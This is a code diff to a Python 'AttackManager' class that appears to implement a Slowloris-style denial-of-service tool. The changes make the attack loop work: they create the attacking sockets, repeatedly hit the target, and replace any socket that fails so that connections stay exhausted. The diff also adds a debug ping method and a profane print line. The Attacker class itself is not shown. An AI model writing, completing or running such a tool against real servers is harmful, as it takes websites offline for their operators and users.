@@ -30,18 +30,34 @@ class AttackManager:
 
     # Procede with an attack
     def attack(self):
+        self.createAttackers()
         while (True):
             for loris in self.socketList:
                 try:
                     loris.attackTarget()
-                    time.sleep(1)
+
                 except Exception as e:
                     self.socketList.remove(loris)
                     newLoris = Attacker(self.target)
                     self.socketList.append(newLoris)
+            time.sleep(2)
+            print("fuck")
 
 
     def createAttackers(self):
-        for i in self.socketCount:
+        for i in range(self.socketCount):
             socket = Attacker(self.target)
+            socket.createSocket()
             self.socketList.append(socket)
+
+    #Used in debugging
+    def printCurrentTargetInfo(self):
+
+        socket = Attacker(self.target)
+        socket.createSocket()
+
+        socket.ping()
+
+
+
+        del socket
